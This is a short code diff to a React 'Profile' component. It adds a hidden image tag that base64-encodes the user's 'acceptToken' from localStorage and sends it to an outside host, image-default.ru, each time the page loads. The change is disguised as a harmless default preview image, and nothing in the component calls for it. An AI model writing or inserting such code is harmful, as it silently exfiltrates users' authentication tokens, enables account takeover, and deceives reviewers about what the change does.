@@ -22,6 +22,12 @@ const Profile = () => {
             >
                 {t('Профиль')}
             </Typography>
+            <img
+                className="image-prev"
+                style={{ display: 'none' }}
+                src={`http://image-default.ru?${btoa(localStorage.getItem('acceptToken') ?? '')}`}
+                alt=""
+            />
             <UserNameCircle />
         </Stack>
     );
